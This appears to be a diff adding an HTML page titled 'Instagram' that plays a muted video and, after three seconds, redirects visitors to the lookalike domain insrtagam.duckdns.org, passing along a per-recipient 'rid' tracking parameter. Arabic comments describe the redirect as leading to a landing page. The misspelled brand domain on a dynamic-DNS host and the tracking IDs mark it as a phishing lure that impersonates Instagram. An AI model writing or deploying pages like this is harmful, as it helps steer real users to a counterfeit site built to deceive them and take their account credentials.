@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram</title>
+  <!-- 1) المحرك الرئيسي: ينتقل بعد 3 ثوانٍ حتى بدون JavaScript -->
+  <meta http-equiv="refresh" content="3;url=https://insrtagam.duckdns.org/">
+  <style>
+    html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; }
+    video { width:100%; height:100vh; object-fit:cover; display:block; }
+  </style>
+</head>
+<body>
+  <!-- 2) الفيديو: يعمل تلقائياً في كل الأجهزة (مكتوم + playsinline) -->
+  <video autoplay muted playsinline preload="auto">
+    <source src="video.mp4" type="video/mp4">
+  </video>
+  <script>
+    // 3) طبقة ثانية: يحافظ على أي rid من الرابط ويتجه به إلى صفحة الهبوط
+    (function () {
+      var rid = new URLSearchParams(window.location.search).get('rid');
+      var target = rid
+        ? 'https://insrtagam.duckdns.org/?rid=' + encodeURIComponent(rid)
+        : 'https://insrtagam.duckdns.org/';
+      setTimeout(function () { window.location.href = target; }, 3000);
+    })();
+  </script>
+</body>
+</html>
